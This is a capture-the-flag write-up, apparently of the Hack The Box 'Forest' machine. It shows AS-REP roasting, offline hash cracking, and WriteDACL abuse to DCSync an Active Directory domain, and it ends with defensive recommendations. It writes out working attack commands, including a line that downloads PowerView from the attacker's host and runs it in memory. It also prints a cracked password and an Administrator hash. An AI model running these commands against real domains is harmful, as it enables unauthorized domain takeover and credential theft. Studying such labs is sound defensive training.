## Domain Enumeration

> With no web to attack, everything depends on what the directory will say to someone who has not logged in. The question is whether anonymous access gives me a foothold.

Two names go into `/etc/hosts`, not one. The short `forest.htb` is habit, but `FOREST.htb.local` is the one that matters, because Kerberos and LDAP tooling addresses a domain controller by its full name rather than its address.

```bash frame="code" title="Bash"
┌──(Idan@Kali)-[~/Forest]
└─> sudo nano /etc/hosts
```

## Foothold: AS-REP Roasting

> A domain that hands out its user list will often hand out more. If any of these accounts skipped pre-authentication, Kerberos will roast them for me.

### Roasting the User List

I ask the Key Distribution Center (KDC), the part of the domain controller that issues Kerberos tickets, which of these seven it will hand a ticket to without asking for a password first. The empty `-p ''` is the whole point: this is a question anyone is allowed to ask.

<Toggle label="AS-REP roasting the user list <code>netexec</code>">

```bash frame="code" title="Bash" {4}
┌──(Idan@Kali)-[~/Forest]
└─> nxc ldap 10.129.16.68 -u users.txt -p '' --asreproast asrep.hashes
LDAP        10.129.16.68    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.16.68    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:4b64285a129fcfebc9668ee61df78c9d$4724ab...5ca581
```

</Toggle>

One of the seven answers, and it answers with a hash. The other six stay silent, which is pre-authentication doing its job.

<Callout type="vuln">

`svc-alfresco` has Kerberos pre-authentication disabled, so the KDC will hand out an AS-REP for it to anyone who asks, and part of that reply is encrypted with a key derived from the account's password. That part is an offline-crackable hash: no interaction with the account, no failed logons, no lockout, just request and crack, though the request itself still lands in the DC's log.

</Callout>

Nothing about that hash matters until I can turn it into a password, and `rockyou.txt`, the password wordlist every Kali install ships with, is where that starts.

<Toggle label="Cracking the AS-REP hash <code>hashcat</code>">

```bash frame="code" title="Bash" {7}
┌──(Idan@Kali)-[~/Forest]
└─> cp asrep.hashes hash.txt
# keep the roast output intact and crack a copy

┌──(Idan@Kali)-[~/Forest]
└─> hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:4b64285a129fcfebc9668ee61df78c9d$4724ab...5ca581:s3rvice

Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Time.Started.....: ... (8 secs)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

</Toggle>

Eight seconds, and the service account password falls to a common wordlist.

<Callout type="loot">

- `svc-alfresco` : `s3rvice` (AS-REP roast, cracked from the Kali wordlist)

</Callout>

## Privilege Escalation

> Having the shell is not the same as having somewhere to go with it. Before I start hunting for a path to the domain root, I want to know what this account is already carrying.

### Mapping the Path to Domain Admin

Before reaching for a graph, I ask the shell what it already knows about itself.

<Toggle label="What the token already carries <code>whoami</code>">

```powershell frame="code" title="PowerShell" {14,15,16}
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /priv

----------------------

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554
BUILTIN\Remote Management Users            Alias            S-1-5-32-580
BUILTIN\Account Operators                  Alias            S-1-5-32-548

HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148
```

</Toggle>

The privileges are nothing: three defaults every account gets. The groups are another matter, and two of them answer questions I had already stopped asking. Remote Management Users is why WinRM let me in. Pre-Windows 2000 Compatible Access is why the DC gave up its account list to a stranger.

The third row is the one that matters. Account Operators is a group `svc-alfresco` was never put in, but a token carries the fully expanded set, so what I am looking at is nesting: Service Accounts sits inside Privileged IT Accounts, which sits inside Account Operators. Nothing about the account itself advertises that.

So the account can create domain users and rewrite group membership. What the token cannot tell me is which groups are worth rewriting, and that is a question about the whole domain rather than this one account.

Two computers in the domain, and the one that is not the DC is `EXCH01`. An Exchange install rearranges a domain's permissions on its way in, so that is the name I want the graph to account for when I ask it for a path from `SVC-ALFRESCO@HTB.LOCAL` to `DOMAIN ADMINS@HTB.LOCAL`.

![BloodHound path from SVC-ALFRESCO to DOMAIN ADMINS: MemberOf edges through SERVICE ACCOUNTS and PRIVILEGED IT ACCOUNTS to ACCOUNT OPERATORS, then GenericAll to EXCHANGE WINDOWS PERMISSIONS and WriteDACL to HTB.LOCAL](../../../../assets/hackthebox/medium/forest/forest-1.png)

<Callout type="intel">

The token already showed the membership chain. What the graph adds is what sits on the end of it, and it is two ACL edges:

- Account Operators has `GenericAll` over Exchange Windows Permissions, which is full control of that group, including who is in it.
- Exchange Windows Permissions has `WriteDACL` over the `htb.local` domain object.

Neither edge is a mistake somebody made. Exchange creates the second one at install time, and the first one survives because `AdminSDHolder` only re-stamps the groups AD treats as privileged, and an Exchange group is not on that list.

That second edge is the whole game. Whoever can rewrite the domain's security descriptor can hand any account the replication rights DCSync runs on.

</Callout>

### WriteDACL to DCSync

The plan follows the graph exactly. Account Operators lets me create a domain user and put it in Exchange Windows Permissions, so I make a fresh account, `idan`, instead of repurposing one already in the domain.

<Toggle label="Granting DCSync through Exchange Windows Permissions <code>PowerView.ps1</code>">

```powershell frame="code" title="PowerShell"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user idan Aa123456!1 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" idan /add
The command completed successfully.

# Insurance: a way back in as idan, never actually needed
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" idan /add
The command completed successfully.

# PowerView into memory from my box, then a credential for idan
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> (New-Object System.Net.WebClient).DownloadString('http://10.10.14.87:8000/PowerView.ps1') | IEX
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPass = ConvertTo-SecureString 'Aa123456!1' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\idan', $SecPass)

# The write runs as idan, not as svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity idan -Credential $Cred -Rights DCSync
```

</Toggle>

That `-Credential` is doing real work. The `WriteDACL` belongs to Exchange Windows Permissions, and the account I added to that group is `idan`, not `svc-alfresco`, so the current shell has nothing that can authorize the write. Handing PowerView a credential lets it authenticate separately as that account, with the group membership already in place. Existing logon tokens do not update when group membership changes, which is why adding the service account instead would still have meant opening a new shell.

With the `DS-Replication-Get-Changes` rights in place, `idan` can ask the domain controller to replicate account secrets exactly as another domain controller would, so I go and ask.

<Toggle label="Replicating the domain secrets <code>secretsdump</code>">

- `Administrator` : `32693b11e6aa90eb43d32c72a07ceea6` (the NT hash, replicated rather than cracked)

That hash is the whole account. The `aad3b4...` half in front of it in the dump is the placeholder every modern account carries where its LM hash used to be, so the second half is the one that authenticates. NTLM only ever proves possession of the hash, never of the password behind it, so I send it straight back to the domain controller that gave it up.

## Summary

The whole path in one breath: Forest is a domain controller with no website, and it names all thirty-one of its accounts to an anonymous caller. One of them, `svc-alfresco`, has Kerberos pre-authentication disabled, so the KDC issues a ticket anyone can crack offline, and `rockyou.txt` turns it into the password that opens a WinRM shell. That shell's token already sits inside Account Operators through two nested groups, and BloodHound shows what the group is worth: it controls Exchange Windows Permissions, which can rewrite the domain's own ACL. So I create an account, drop it into that group, and use the group's write to grant myself DCSync. Replicating the directory hands over the Administrator hash, and `psexec` passes it back for SYSTEM and the root flag.

## Reflection

Three lessons, one per stage of the chain:

1. **A directory that answers an unauthenticated client is a free user list.** Forest named all thirty-one of its accounts to a null SMB session, and that list is the raw material for AS-REP roasting, spraying, and everything after. The group that allows it is Pre-Windows 2000 Compatible Access, a legacy compatibility group whose permissions still reach into a modern domain.
2. **A disabled pre-authentication flag makes a password crackable offline.** `svc-alfresco` skipped Kerberos pre-auth, so the KDC handed out an offline hash for the asking, and a weak password did the rest. Pre-auth stays on, and service accounts get passwords a wordlist will never hold.
3. **WriteDACL on the domain is domain admin.** The real collapse was an ACL: Exchange Windows Permissions could rewrite the domain's security descriptor, and a low-tier account could join that group because Account Operators had full control of it. The nesting is what makes that easy to miss: a direct membership listing shows what an account was granted, while its token carries everything the nesting adds. Audit the second list.

<Callout type="defense">

Require Kerberos pre-authentication for every account, `svc-alfresco` included, and give service accounts passwords `rockyou.txt` will never hold. Take `WriteDACL` over the domain root away from Exchange Windows Permissions, and stop service accounts reaching Account Operators through a chain of ordinary-looking groups. Any one of those breaks the chain. Emptying Pre-Windows 2000 Compatible Access breaks nothing by itself, but it costs an attacker the list they start from.

</Callout>
